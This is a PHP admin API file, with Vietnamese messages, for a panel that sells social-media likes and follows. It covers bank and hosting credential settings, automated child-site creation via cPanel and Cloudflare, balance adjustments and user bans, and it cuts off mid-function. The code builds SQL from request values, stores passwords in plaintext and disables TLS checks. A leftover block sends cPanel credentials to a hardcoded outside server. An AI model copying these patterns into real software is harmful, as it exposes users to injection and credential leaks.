<?php require('../../config/function.php');

if ($_SERVER['REQUEST_METHOD'] == 'GET' && realpath(__FILE__) == realpath($_SERVER['SCRIPT_FILENAME'])) {
    /****
       Up to you which header to send, some prefer 403 even if 
       the files does exist for security
     ****/
    /**** header( 'HTTP/1.0 403 Not Found', TRUE, 403 ); ****/
    /**** include('403.html'); ****/
    include('../../../pages/error405.php');
    // $return['status'] = false;
    // $return['error'] = 'error';
    // $return['msg']   = 'Method GET not allowed!';
    // die(json_encode($return));
    /**** choose the appropriate page to redirect users ****/
} else {

    $action = check_string($_POST['action']);

    if ($action == 'update_account_mbbank') {

        $api_token = api_token();
        $checkusite = $LTT->get_row(" SELECT * FROM `users` WHERE `token` = '$api_token'  AND  `url_config` = '" . $url_site_name . "' ");

        if (empty($api_token)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Thiếu API Token";
            die(json_encode($return));
        }

        if (!$checkusite) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "API Token không hợp lệ";
            die(json_encode($return));
        }

        if ($checkusite['capbac'] != 99) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Bạn không phải ADMIN !";
            die(json_encode($return));
        }

        $update = $LTT->update("options", [
            'value' => $_POST['account_mbbank']
        ], " `key` = 'account_mbbank' ");

        $update = $LTT->update("options", [
            'value' => $_POST['password_mbbank']
        ], " `key` = 'password_mbbank' ");

        $update = $LTT->update("options", [
            'value' => $_POST['account_mbbank_no']
        ], " `key` = 'account_mbbank_no' ");

        if ($update) {
            $return['status'] = true;
            $return['error'] = false;
            $return['message']   = "Cập nhật thành công";
            die(json_encode($return));
        } else {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "API Token không hợp lệ";
            die(json_encode($return));
        }
    }

    if ($action == 'update_cookie_tsr') {

        $keyupdate            = check_string($_POST['keyupdate']);
        $api_token = api_token();
        $checkusite = $LTT->get_row(" SELECT * FROM `users` WHERE `token` = '$api_token'  AND  `url_config` = '" . $url_site_name . "' ");

        if (empty($api_token)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Thiếu API Token";
            die(json_encode($return));
        }

        if (!$checkusite) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "API Token không hợp lệ";
            die(json_encode($return));
        }

        if ($checkusite['capbac'] != 99) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Bạn không phải ADMIN !";
            die(json_encode($return));
        }

        $update = $LTT->update("options", [
            'value' => $_POST['dataInput']
        ], " `key` = '$keyupdate' ");

        if ($update) {
            $return['status'] = true;
            $return['error'] = false;
            $return['message']   = "Cập nhật thành công";
            die(json_encode($return));
        } else {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "API Token không hợp lệ";
            die(json_encode($return));
        }
    }


    if ($action == "set_tao_site") {
        $api_token = api_token();
        $checkusite = $LTT->get_row(" SELECT * FROM `users` WHERE `token` = '$api_token'  AND  `url_config` = '" . $url_site_name . "' ");

        if (empty($api_token)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Thiếu API Token";
            die(json_encode($return));
        }

        if (!$checkusite) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "API Token không hợp lệ";
            die(json_encode($return));
        }
        if ($checkusite['capbac'] < $LTT->site('cap_bac_tao_site')) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Bạn chưa đủ điều kiện để thực hiện !";
            die(json_encode($return));
        }
        if ($checkusite['money'] < $LTT->site('so_du_tao_site')) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Bạn chưa đủ điều kiện để thực hiện !";
            die(json_encode($return));
        }
        if ($LTT->num_rows(" SELECT * FROM `ds_sitecon` WHERE `username` = '" . $checkusite['username'] . "' ") >= 10) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Bạn Đã Hết Lượt Tạo Website !";
            die(json_encode($return));
        }
        $domain     = check_string($_POST['domain']);
        $status_domain = check_mien($domain);

        $get_mien = $LTT->get_row(" SELECT * FROM `setting` WHERE `url_config` = '" . strtoupper($domain) . "'");
        if ($get_mien) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Tên Miền Đã Tồn Tại Trên Hệ Thống !";
            die(json_encode($return));
        }

        //ĐIỀU KIỆN TẠO SITE
        if (!$domain) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Vui Lòng Nhập Tên Miền !";
            die(json_encode($return));
        }


        $create = $LTT->insert("setting", [
            'partner_id'      => '',
            'partner_key'          => '',
            'facebook'      => '',
            'id_page'         => '',
            'base_url'        => 'https://' . $domain . '/',
            'cuphap'         => "NAPTIEN",
            'site_napthe'       => 'thesieure',
            'logo'       => '',
            'trangthai_auto'        => 'ON',
            'trang_thai_lam_tron' => 'ON',
            'full_name_admin'            => '',
            'phone_zalo'        => '+84',
            'rate_ctv'          => '1000000',
            'rate_daily' => '3500000',
            'rate_admin' => '15000000',
            'ten_website' => strtoupper($domain),
            'logo_user' => 'https://ui-avatars.com/api/?background=random&name=',
            'favicon' => 'https://i.imgur.com/9yZhV9g.jpg',
            'api_automm' => '',
            'script_live_chat' => '',
            'bao_tri' => 'ON',
            'logo_mini' => 'https://i.imgur.com/9yZhV9g.jpg',
            'tu_khoa' => 'Tăng like Facebook, tuongtaccheo, traodoisub, tăng like, tăng follow facebook, tiktok, instagram, miễn phí, tương tác chéo, trao đổi sub. Hệ thống mua like uy tín, Tăng like giá rẻ , Dịch vụ tăng like tăng sub giá rẻ, tăng view video FB, Tăng người xem Livestream, tăng theo dõi, tăng like Facebook, tuongtaccheo, traodoisub, tăng like, tăng follow facebook, tiktok, instagram, miễn phí, tương tác chéo, trao đổi sub, giá rẻ đảm bảo uy tín, chất lượng...',
            'anhbia' => 'https://skillking.fpt.edu.vn/wp-content/uploads/2021/04/social-media-marketing-gom-nhung-gi-cach-thuc-do-luong-hieu-qua-social-media-marketing.png',
            'user_auto_dvfb' => '',
            'pass_auto_dvfb' => '',
            'ck_ctv' => '8',
            'ck_dl' => '5',
            'ck_npp' => '2',
            'gioi_thieu_web' => 'Trang Dịch Vụ Mạng Xã Hội Số 1 !',
            'ck_user' => '10',
            'thongbao' => '',
            'callback_momo' => 'https://' . $domain . '/callback/callback_bank.php',
            'anh_thong_bao' => 'https://i.imgur.com/3qFEGjW.jpg',
            'ck_thecao' => '30',
            'token_auto_dvfb' => '',
            'theme_login' => '3',
            'status' => 'wait',
            'theme_landing' => '5',
            'theme_home' => '1',
            'img_1' => 'https://ngaocontent.com/wp-content/uploads/2020/11/Social-content-la-gi-2.jpg',
            'img_2' => 'https://i.imgur.com/bRHvcCN.png',
            'img_3' => 'https://prodima.vn/wp-content/uploads/2021/06/social-content-la-gi-chien-luoc-xay-dung-noi-dung-social-dinh-cao-1.jpg',
            'bg_header_site' => '#f5f4fe',
            'so_du_tao_site' => '100000',
            'so_tieu_tao_site' => '100000',
            'cap_bac_tao_site' => '1',



            'bg_navbar_site' => '#2f3542',
            'icon_color_site' => '#212529',
            'text_color_site' => '#ffffff',

            'url_config'          => strtoupper($domain),
        ]);


        if ($create) {
            $create2 = $LTT->insert("ds_sitecon", [
                'username'      => $checkusite['username'],
                'domain'          => $domain,
                'token'      => $checkusite['token'],
                'ip'         => getip(),
                'date'        => gettime(),
                'site_me'         => strtoupper($_SERVER['SERVER_NAME']),
                'site_con'       => strtoupper($domain),
                'url_config'          => $url_site_name,
                'status' => 'Active'
            ]);
            $create_user = $LTT->insert("users", [
                'username'      => $checkusite['username'],
                'name'          => $checkusite['name'],
                'password'      => $checkusite['password'],
                'token'         => $checkusite['token'],
                'capbac'        => 99,
                'money'         => 0,
                'tongnap'       => 0,
                'tongtru'       => 0,
                'banned'        => 0,
                'email' => $checkusite['email'],
                'ip'            => getip(),
                'cuphap'        => 'NAPTIEN ' . $checkusite['username'],
                'date'          => gettime(),
                'url_config'          => strtoupper($domain),
            ]);

            //GHI LS
            $ghilog = $LTT->insert("log_site", [
                'username' => $checkusite['username'],
                'note'          => 'Đăng kí website con',
                'ip'            => getip(),
                'date'          => gettime(),
                'url_config' => $url_site_name
            ]);



            if ($create_user) {
                $IP_HOST = $LTT->check('ip_host');
                $cpanelusername =  $LTT->check('username_host');
                $cpanelpassword =  $LTT->check('password_host');
                $link_cpanel = $LTT->check('link_host');
                $query = $link_cpanel . "json-api/cpanel?cpanel_jsonapi_apiversion=2&cpanel_jsonapi_module=Park&cpanel_jsonapi_func=park&domain=$domain";
                $curl = curl_init();
                curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
                curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
                curl_setopt($curl, CURLOPT_HEADER, 0);
                curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
                $header[0] = "Authorization: Basic " . base64_encode($cpanelusername . ":" . $cpanelpassword) . "\n\r";
                curl_setopt($curl, CURLOPT_HTTPHEADER, $header);
                curl_setopt($curl, CURLOPT_URL, $query);
                $date = curl_exec($curl);
                curl_close($curl);
                $status_site = $LTT->get_row(" SELECT * FROM `setting` WHERE `url_config` = '" . $LTT->check('url_admin') . "'");
                $data = array(
                    'domain' => "taile.ml",
                    'url'    => "https://taile.ml/",
                );
                $header[0] = "Authorization: Basic " . base64_encode($cpanelusername . ":" . $cpanelpassword) . "\n\r";
                $url = "https://sng106.arandomserver.com:2083/cpsess8220533488/frontend/paper_lantern/park/saveredirect.html?domain=taile.ml&url=https://kk.ml/";
                $curl = curl_init();
                curl_setopt_array($curl, array(
                    CURLOPT_URL => $url,
                    CURLOPT_RETURNTRANSFER => true,
                    CURLOPT_ENCODING => '',
                    CURLOPT_MAXREDIRS => 10,
                    CURLOPT_TIMEOUT => 30,
                    CURLOPT_FOLLOWLOCATION => true,
                    CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
                    CURLOPT_CUSTOMREQUEST => 'GET',
                    CURLOPT_HTTPHEADER => $header,
                ));
                $response = curl_exec($curl);
                curl_close($curl);
                $result = json_decode($response, true);

                
                $id_cloud_fl = $LTT->check('id_cloud_flare');
                $id_ = ['id' => $id_cloud_fl];
                $post_data_IPV = [
                    'account' => $id_,
                    'name' => $domain,
                    'jump_start' => true,
                ];
                $curl = curl_init();
                curl_setopt_array($curl, array(
                    CURLOPT_URL => 'https://api.cloudflare.com/client/v4/zones',
                    CURLOPT_RETURNTRANSFER => true,
                    CURLOPT_ENCODING => '',
                    CURLOPT_MAXREDIRS => 10,
                    CURLOPT_TIMEOUT => 0,
                    CURLOPT_FOLLOWLOCATION => true,
                    CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
                    CURLOPT_CUSTOMREQUEST => 'POST',
                    CURLOPT_POSTFIELDS => json_encode($post_data_IPV),
                    CURLOPT_HTTPHEADER => array(
                        'X-Auth-Key: ' . $LTT->check('key_cloud_flare'),
                        'X-Auth-Email: ' . $LTT->check('email_cloud_flare'),
                        'Content-Type: application/json'
                    ),
                ));
                $responsee = curl_exec($curl);
                curl_close($curl);
                $json_check = json_decode($responsee, true);
                $id_domain = $json_check['result']['id'];

                $post_data_IP_H = '
{
  "content": "' . $IP_HOST . '",
  "data": {},
  "name": "' . $domain . '",
  "proxiable": true,
  "proxied": true,
  "ttl": 1,
  "type": "A",
  "zone_id": "' . $id_domain . '",
  "zone_name": "' . $domain . '"
}';
                $curl = curl_init();
                curl_setopt_array($curl, array(
                    CURLOPT_URL => 'https://api.cloudflare.com/client/v4/zones/' . $id_domain . '/dns_records',
                    CURLOPT_RETURNTRANSFER => true,
                    CURLOPT_ENCODING => '',
                    CURLOPT_MAXREDIRS => 10,
                    CURLOPT_TIMEOUT => 0,
                    CURLOPT_FOLLOWLOCATION => true,
                    CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
                    CURLOPT_CUSTOMREQUEST => 'POST',
                    CURLOPT_POSTFIELDS => $post_data_IP_H,
                    CURLOPT_HTTPHEADER => array(
                        'X-Auth-Key: ' . $LTT->check('key_cloud_flare'),
                        'X-Auth-Email: ' . $LTT->check('email_cloud_flare'),
                        'Content-Type: application/json'
                    ),
                ));
                $responsex = curl_exec($curl);
                curl_close($curl);

                $post_data2 = '
{
  "content": "' . $domain . '",
  "data": {},
  "name": "www",
  "proxiable": true,
  "proxied": true,
  "ttl": 1,
  "type": "CNAME",
  "zone_id": "' . $id_domain . '",
  "zone_name": "' . $domain . '"
}';
                $curl_2 = curl_init();
                curl_setopt_array($curl_2, array(
                    CURLOPT_URL => 'https://api.cloudflare.com/client/v4/zones/' . $id_domain . '/dns_records',
                    CURLOPT_RETURNTRANSFER => true,
                    CURLOPT_ENCODING => '',
                    CURLOPT_MAXREDIRS => 10,
                    CURLOPT_TIMEOUT => 0,
                    CURLOPT_FOLLOWLOCATION => true,
                    CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
                    CURLOPT_CUSTOMREQUEST => 'POST',
                    CURLOPT_POSTFIELDS => $post_data2,
                    CURLOPT_HTTPHEADER => array(
                        'X-Auth-Key: ' . $LTT->check('key_cloud_flare'),
                        'X-Auth-Email: ' . $LTT->check('email_cloud_flare'),
                        'Content-Type: application/json'
                    ),
                ));
                $response = curl_exec($curl_2);
                curl_close($curl_2);
            }



            $return['status'] = true;
            $return['error'] = false;
            $return['message']   = "Đăng kí thành công !";
            die(json_encode($return));
        }
    }




    if ($action == "set_config_admin") {





        $api_token = api_token();
        $checkusite = $LTT->get_row(" SELECT * FROM `users` WHERE `token` = '$api_token'  AND  `url_config` = '" . $url_site_name . "' ");

        if (empty($api_token)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Thiếu API Token";
            die(json_encode($return));
        }

        if (!$checkusite) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "API Token không hợp lệ";
            die(json_encode($return));
        }

        if ($checkusite['capbac'] != 99) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Bạn không phải ADMIN !";
            die(json_encode($return));
        }

        $link_host          = check_string($_POST['link_host']);
        $ip_host          = check_string($_POST['ip_host']);
        $username_host          = check_string($_POST['username_host']);
        $password_host        = check_string($_POST['password_host']);
        $ns1        = check_string($_POST['name_sv1']);
        $ns2        = check_string($_POST['name_sv2']);
        $ns3        = check_string($_POST['name_sv3']);
        $ns4        = check_string($_POST['name_sv4']);



        if (empty($link_host)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Bạn chưa nhập link host !";
            die(json_encode($return));
        }
        if (empty($ip_host)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Bạn chưa nhập ip host !";
            die(json_encode($return));
        }
        if (empty($username_host)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Bạn chưa nhập username host !";
            die(json_encode($return));
        }
        if (empty($password_host)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Bạn chưa nhập mật khẩu host !";
            die(json_encode($return));
        }
        if (empty($ns1)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Bạn chưa nhập NameServer Hostting 1 !";
            die(json_encode($return));
        }
        if (empty($ns2)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Bạn chưa nhập NameServer Hostting 2 !";
            die(json_encode($return));
        }

        $update = $LTT->update("options", [
            'value' => $link_host
        ], " `key` = 'link_host' ");

      
        $update1 = $LTT->update("options", [
            'value' => $ip_host
        ], " `key` = 'ip_host' ");

        $update2 = $LTT->update("options", [
            'value' => $username_host
        ], " `key` = 'username_host' ");


        $update4 = $LTT->update("options", [
            'value' => $password_host
        ], " `key` = 'password_host' ");

        $update5 = $LTT->update("options", [
            'value' => $ns1
        ], " `key` = 'name_sv1' ");

        $update6 = $LTT->update("options", [
            'value' => $ns2
        ], " `key` = 'name_sv2' ");

        $update7 = $LTT->update("options", [
            'value' => $ns3
        ], " `key` = 'name_sv3' ");

        $update8 = $LTT->update("options", [
            'value' => $ns4
        ], " `key` = 'name_sv4' ");
        if ($update || $update1 || $update2 || $update4 || $update5 || $update6 || $update7 || $update8) {

            $return['status'] = true;
            $return['error'] = false;
            $return['message']   = "Cập nhật thành công";
            die(json_encode($return));
        } else {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Lỗi hệ thống";
            die(json_encode($return));
        }
    }




    if ($action == "set_noti2") {



        $api_token = api_token();
        $checkusite = $LTT->get_row(" SELECT * FROM `users` WHERE `token` = '$api_token'  AND  `url_config` = '" . $url_site_name . "' ");

        if (empty($api_token)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Thiếu API Token";
            die(json_encode($return));
        }

        if (!$checkusite) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "API Token không hợp lệ";
            die(json_encode($return));
        }

        if ($checkusite['capbac'] != 99) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Bạn không phải ADMIN !";
            die(json_encode($return));
        }
        $thongbao_noi     = check_string($_POST['thongbao_noi']);
        $anh_thong_bao     = check_string($_POST['anh_thong_bao']);
        $thong_bao_mail = check_string($_POST['thong_bao_mail']);

        $update123 = $LTT->update("setting", [
            'thong_bao_mail' => $thong_bao_mail
        ], " `url_config` = '" . $url_site_name . "' ");
        $update1 = $LTT->update("setting", [
            'thongbao' => $thongbao_noi
        ], " `url_config` = '" . $url_site_name . "' ");
        $update2 = $LTT->update("setting", [
            'anh_thong_bao' => $anh_thong_bao
        ],  " `url_config` = '" . $url_site_name . "' ");
        if ($update1 || $update2) {
            $return['status'] = true;
            $return['error'] = false;
            $return['message']   = "Sửa thông báo thành công";
            die(json_encode($return));
        } else {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Lỗi thông báo";
            die(json_encode($return));
        }
    }
    if ($action == "set_all") {
        $api_token = api_token();
        if (empty($api_token)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Thiếu API Token";
            die(json_encode($return));
        }
        $checkusite = $LTT->get_row(" SELECT * FROM `users` WHERE `token` = '$api_token'  AND  `url_config` = '" . $url_site_name . "' ");



        if (!$checkusite) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "API Token không hợp lệ";
            die(json_encode($return));
        }

        if ($checkusite['capbac'] != 99) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Bạn không phải ADMIN !";
            die(json_encode($return));
        }
        $trang_thai_lam_tron  = check_string($_POST['trang_thai_lam_tron']);
        $ck_thecao            = check_string($_POST['ck_thecao']);
        $gioi_thieu_web            = check_string($_POST['gioi_thieu_web']);
        $baseurl            = check_string($_POST['baseurl']);
        $tenwebsite         = check_string($_POST['tenwebsite']);
        $logo          = check_string($_POST['logo']);
        $logo_mini          = check_string($_POST['logo_mini']);
        $ratectv            = check_string($_POST['ratectv']);
        $ratedaily          = check_string($_POST['ratedaily']);
        $ratenpp          = check_string($_POST['ratenpp']);
        $favicon         = check_string($_POST['favicon']);
        $anhbia = check_string($_POST['anhbia']);
        $id_page_chat  = check_string($_POST['id_page_chat']);
        $ck_user         = check_string($_POST['ck_user']);
        $ck_npp          = check_string($_POST['ck_npp']);
        $ck_dl         = check_string($_POST['ck_dl']);
        $ck_ctv = check_string($_POST['ck_ctv']);
        $token_facebook = check_string($_POST['otp']);

        $mail_config = check_string($_POST['mail_config']);
        $pass_mail_config = check_string($_POST['pass_mail_config']);
        $bot_tele = check_string($_POST['bot_tele']);
        $id_chat_tele = check_string($_POST['id_chat_tele']);
        $script_live_chat = check_string($_POST['script_live_chat']);
        $tu_khoa = check_string($_POST['tu_khoa']);
        $bao_tri = check_string($_POST['bao_tri']);
        $hotline = check_string($_POST['hotline']);
        $facebook = check_string($_POST['facebook']);
        $img_1 = check_string($_POST['img_1']);
        $img_2 = check_string($_POST['img_2']);
        $img_3 = check_string($_POST['img_3']);


        if (empty($baseurl)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Bạn chưa nhập link website";
            die(json_encode($return));
        }

        if (empty($tenwebsite)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Bạn chưa nhập tên website";
            die(json_encode($return));
        }
        if (empty($logo)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Bạn chưa nhập link logo";
            die(json_encode($return));
        }
        if (empty($ratectv)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Bạn chưa nhập rate ctv";
            die(json_encode($return));
        }
        if (empty($ratedaily)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Bạn chưa nhập rate đại lý";
            die(json_encode($return));
        }
        if (empty($ratenpp)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Bạn chưa nhập rate npp";
            die(json_encode($return));
        }
        if (empty($gioi_thieu_web)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Vui lòng nhập mô tả";
            die(json_encode($return));
        }
        if (empty($img_1) || empty($img_2) || empty($img_3)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Bạn chưa nhập link ảnh !";
            die(json_encode($return));
        }
        $update_img = $LTT->update("setting", [
            'img_1' => $img_1,
            'img_2' => $img_2,
            'img_3' => $img_3
        ], " `url_config` = '" . $url_site_name . "' ");


        $update3q1 = $LTT->update("setting", [
            'bot_tele' => $bot_tele
        ], " `url_config` = '" . $url_site_name . "' ");

        $update4q1 = $LTT->update("setting", [
            'id_chat_tele' => $id_chat_tele
        ], " `url_config` = '" . $url_site_name . "' ");




        $zzzzzzz = $LTT->update("setting", [
            'pass_mail_config' => $pass_mail_config
        ], " `url_config` = '" . $url_site_name . "' ");
        $xxxxx = $LTT->update("setting", [
            'mail_config' => $mail_config
        ], " `url_config` = '" . $url_site_name . "' ");

        $update5c1 = $LTT->update("setting", [
            'id_page_chat' => $id_page_chat
        ], " `url_config` = '" . $url_site_name . "' ");
        $update5c2 = $LTT->update("setting", [
            'auth_otp' => $token_facebook
        ], " `url_config` = '" . $url_site_name . "' ");
        $updatev2 = $LTT->update("setting", [
            'gioi_thieu_web' => $gioi_thieu_web
        ], " `url_config` = '" . $url_site_name . "' ");
        $update = $LTT->update("setting", [
            'base_url' => $baseurl
        ], " `url_config` = '" . $url_site_name . "' ");

        $update1 = $LTT->update("setting", [
            'ten_website' => $tenwebsite
        ], " `url_config` = '" . $url_site_name . "' ");

        $update2 = $LTT->update("setting", [
            'logo' => $logo
        ], " `url_config` = '" . $url_site_name . "' ");

        $update3 = $LTT->update("setting", [
            'rate_ctv' => $ratectv
        ], " `url_config` = '" . $url_site_name . "' ");

        $update4 = $LTT->update("setting", [
            'rate_daily' => $ratedaily
        ], " `url_config` = '" . $url_site_name . "' ");

        $update5 = $LTT->update("setting", [
            'rate_admin' => $ratenpp
        ], " `url_config` = '" . $url_site_name . "' ");
        $update6 = $LTT->update("setting", [
            'favicon' => $favicon
        ], " `url_config` = '" . $url_site_name . "' ");


        $updatetrang_thai_lam_tron = $LTT->update("setting", [
            'trang_thai_lam_tron' => $trang_thai_lam_tron
        ], " `url_config` = '" . $url_site_name . "' ");
        $update8 = $LTT->update("setting", [
            'bao_tri' => $bao_tri
        ], " `url_config` = '" . $url_site_name . "' ");
        $update9 = $LTT->update("setting", [
            'phone_zalo' => $hotline
        ], " `url_config` = '" . $url_site_name . "' ");
        $update10 = $LTT->update("setting", [
            'facebook' => $facebook
        ], " `url_config` = '" . $url_site_name . "' ");
        $update11 = $LTT->update("setting", [
            'script_live_chat' => $script_live_chat
        ], " `url_config` = '" . $url_site_name . "' ");
        $update12 = $LTT->update("setting", [
            'anhbia' => $anhbia
        ], " `url_config` = '" . $url_site_name . "' ");
        $update13 = $LTT->update("setting", [
            'logo_mini' => $logo_mini
        ], " `url_config` = '" . $url_site_name . "' ");
        $update14 = $LTT->update("setting", [
            'tu_khoa' => $tu_khoa
        ], " `url_config` = '" . $url_site_name . "' ");
        $update15 = $LTT->update("setting", [
            'ck_dl' => $ck_dl
        ], " `url_config` = '" . $url_site_name . "' ");

        $update16 = $LTT->update("setting", [
            'ck_ctv' => $ck_ctv
        ], " `url_config` = '" . $url_site_name . "' ");
        $update15 = $LTT->update("setting", [
            'ck_npp' => $ck_npp
        ], " `url_config` = '" . $url_site_name . "' ");


        $text_color32 = $LTT->update("setting", [
            'ck_user' => $ck_user
        ], " `url_config` = '" . $url_site_name . "' ");

        $text_color3d2 = $LTT->update("setting", [
            'ck_thecao' => $ck_thecao
        ], " `url_config` = '" . $url_site_name . "' ");



        if ($update || $update1 || $update2 || $update3 || $update4 || $update5 || $update6 || $update10 || $update8 || $update9 || $update11 || $update12 || $update13 || $update14 || $updatev2 || $text_color32) {
            $return['status'] = true;
            $return['error'] = false;
            $return['message']   = "Cập nhật thành công";
            die(json_encode($return));
        } else {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Lỗi hệ thống";
            die(json_encode($return));
        }
    }
    if ($action == "set_congtien") {


        $moneyuser     = check_string($_POST['username']);
        $usermoney       = check_string($_POST['usermoney']);
        $action2       = check_string($_POST['action2']);
        $noidung = check_string($_POST['noidung']);
        $api_token = api_token();
        $checkusite = $LTT->get_row(" SELECT * FROM `users` WHERE `token` = '$api_token'  AND  `url_config` = '" . $url_site_name . "' ");

        if (empty($api_token)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Thiếu API Token";
            die(json_encode($return));
        }

        if (!$checkusite) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "API Token không hợp lệ";
            die(json_encode($return));
        }

        if ($checkusite['capbac'] != 99) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Bạn không phải ADMIN !";
            die(json_encode($return));
        }
        if (!$moneyuser) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Vui lòng nhập tên username";
            die(json_encode($return));
        }

        if (!$usermoney) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Vui lòng nhập số tiền";
            die(json_encode($return));
        }
        $selectservice = $LTT->get_row("SELECT * FROM `users` WHERE `username` = '$moneyuser'  AND  `url_config` = '" . $url_site_name . "' ");
        if (!$selectservice) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Username $moneyuser không tồn tại";
            die(json_encode($return));
        }
        if ($action2 == "cong") {


            $update1 = $LTT->cong("users", "money", $usermoney, " `username` = '$moneyuser'  AND  `url_config` = '" . $url_site_name . "' ");
            $update2 = $LTT->cong("users", "tongnap", $usermoney, " `username` = '$moneyuser'  AND  `url_config` = '" . $url_site_name . "' ");
            $ghilog = $LTT->insert("log_site", [
                'username' => $moneyuser,
                'note'          => $noidung,
                'ip'            => getip(),
                'date'          => gettime(),
                'url_config'          => $url_site_name
            ]);
            if ($update1) {
                $return['status'] = true;
                $return['error'] = false;
                $return['message'] = 'Cộng thành công';
                die(json_encode($return));
            } else {
                $return['status'] = false;
                $return['error'] = true;
                $return['message'] = 'Đã xảy ra lỗi';
                die(json_encode($return));
            }
        } elseif ($action2 == "tru") {
            if ($selectservice['money'] < $usermoney) {
                $return['status'] = false;
                $return['error'] = true;
                $return['message'] = 'Số tiền của thành viên ít hơn vậy !';
                die(json_encode($return));
            }

            $update1 = $LTT->tru("users", "money", $usermoney, " `username` = '$moneyuser'  AND  `url_config` = '" . $url_site_name . "' ");
            $ghilog = $LTT->insert("log_site", [
                'username' => $moneyuser,
                'note'          => $noidung,
                'ip'            => getip(),
                'date'          => gettime(),
                'url_config'          => $url_site_name
            ]);
            if ($update1) {
                $return['status'] = true;
                $return['error'] = false;
                $return['message'] = 'Trừ thành công';
                die(json_encode($return));
            } else {
                $return['status'] = false;
                $return['error'] = true;
                $return['message'] = 'Đã xảy ra lỗi';
                die(json_encode($return));
            }
        } else {
            $return['status'] = false;
            $return['error'] = true;
            $return['message'] = 'Đã xảy ra lỗi';
            die(json_encode($return));
        }
    }
    if ($action == "set_band") {
        $hanhdong     = check_string($_POST['action2']);
        $keyuser     = check_string($_POST['username']);

        $api_token = api_token();
        $checkusite = $LTT->get_row(" SELECT * FROM `users` WHERE `token` = '$api_token'  AND  `url_config` = '" . $url_site_name . "' ");

        if (empty($api_token)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Thiếu API Token";
            die(json_encode($return));
        }

        if (!$checkusite) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "API Token không hợp lệ";
            die(json_encode($return));
        }

        if ($checkusite['capbac'] != 99) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Bạn không phải ADMIN !";
            die(json_encode($return));
        }

        $checkusite2 = $LTT->get_row(" SELECT * FROM `users` WHERE `username` = '$keyuser'  AND  `url_config` = '" . $url_site_name . "' ");

        if (!$checkusite2) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Username không tồn tại";
            die(json_encode($return));
        } else {
            if ($hanhdong == "mo") {
                if ($checkusite2['banned'] == 0) {
                    $return['status'] = false;
                    $return['error'] = true;
                    $return['message']   = "Username đã unlock rồi";
                    die(json_encode($return));
                } else {
                    $update2 = $LTT->update("users", ['banned'  => 0], " `username` = '$keyuser'  AND  `url_config` = '" . $url_site_name . "' ");
                    if ($update2) {
                        $return['status'] = true;
                        $return['error'] = false;
                        $return['message']   = "Đã unlock user $keyuser";
                        die(json_encode($return));
                    } else {
                        $return['status'] = false;
                        $return['error'] = true;
                        $return['message']   = "Lỗi hệ thống, không thể unlock $keyuser";
                        die(json_encode($return));
                    }
                }
            }

            if ($hanhdong == "khoa") {
                if ($checkusite2['banned'] > 0) {
                    $return['status'] = false;
                    $return['error'] = true;
                    $return['message']   = "Username đã bị block rồi";
                    die(json_encode($return));
                } else {
